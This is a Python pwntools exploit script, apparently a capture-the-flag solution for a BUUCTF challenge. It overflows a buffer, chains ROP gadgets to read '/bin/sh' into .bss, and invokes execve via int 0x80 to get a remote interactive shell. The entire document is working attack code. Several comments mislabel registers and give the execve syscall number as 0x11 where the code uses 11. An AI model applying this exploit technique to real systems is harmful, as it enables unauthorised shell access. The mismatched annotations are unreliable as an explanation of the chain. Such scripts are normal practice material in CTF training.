from pwn import *
context.log_level='debug'
# io = process('./pwn')
io = remote('node4.buuoj.cn', 26121)
int80 = 0x80493E1
popeax_ret = 0x80BAE06
popedx_ret = 0x806e82a
popecx_ebx_ret = 0x806E851
addesp0x14_ret = 0x807b36c
bss = 0x80EB060
read = 0x806CD50
payload = cyclic(0x14 + 12)

payload += p32(read)			# call read()
payload += p32(addesp0x14_ret)	# return address, add esp to execute latter ROP
payload += p32(0)				# arg #1 of read(): stdin
payload += p32(bss)				# arg #2 of read(): a bss address
payload += p32(0x8)				# arg #3 of read(): read length
payload += p32(0) * 2

payload += p32(popeax_ret)		# eax = 0x11(SYS_EXECVE)
payload += p32(11)
payload += p32(popecx_ebx_ret)
payload += p32(0)				# ebx = '/bin/sh'
payload += p32(bss)				# edx = 0
payload += p32(popedx_ret)
payload += p32(0)				# ecx = 0
payload += p32(int80)			# int 80

io.sendline(payload)
io.sendline(b'/bin/sh' + b'\x00')
io.interactive()
